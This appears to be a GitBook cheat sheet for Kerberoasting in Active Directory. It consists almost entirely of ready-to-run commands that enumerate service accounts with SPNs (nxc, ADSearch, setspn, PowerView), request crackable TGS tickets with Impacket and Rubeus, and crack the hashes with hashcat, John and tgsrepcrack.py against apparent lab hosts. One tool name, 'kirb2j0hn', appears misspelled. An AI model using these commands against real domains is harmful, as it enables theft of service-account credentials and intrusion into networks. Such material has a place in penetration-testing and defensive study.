---
description: >-
  The goal of Kerberoasting is to harvest TGS tickets for services that run on
  behalf of user accounts in the AD, not computer accounts.
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/kerberos-attack/kerberoasting
---

# Kerberoasting

## Discovery Kerberos Account

{% code overflow="wrap" %}
```bash
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```
{% endcode %}

```powershell
# ADSearch
ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

# Setspn
PS C:\> setspn -T vulnableone.local -Q */*

# PowerView
Get-DomainUser -SPN | select serviceprincipalname

# AD-Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

## Kerberoasting via AS-REP Roasting

{% code overflow="wrap" %}
```bash
nxc ldap 192.168.0.104 -u harry -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
```
{% endcode %}

## Impacket

```python
impacket-GetUserSPNs vulnableone.local/svc:Passvord123 -dc-ip 10.10.10.10 -request
```

### Rubeus

```powershell
Rubeus.exe kerberoast /simple /nowrap
Rubeus.exe kerberoast /user:svc /nowrap
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /rc4opsec /outfile:C:\Users\khan.chanthou\Desktop\hashes.txt
Rubeus.exe kerberoast /rc4opsec /domain:vulnableone.local /outfile:C:\Users\khan.chanthou\Desktop\hashes.txt
```

## Crack Hash

### Hashcat

```bash
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlist/rockyou.txt
```

### John

```bash
kirb2j0hn ticket.kirbi > crackfile
john --format=krb5tgs crackfile --wordlist=10k-worst-pass.txt
```

### Crack with kerberos tool

{% code overflow="wrap" %}
```python
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-svc@HTTP~WEB.vulnableone.local-VULNABLEONE.LOCAL.kirbi
```
{% endcode %}
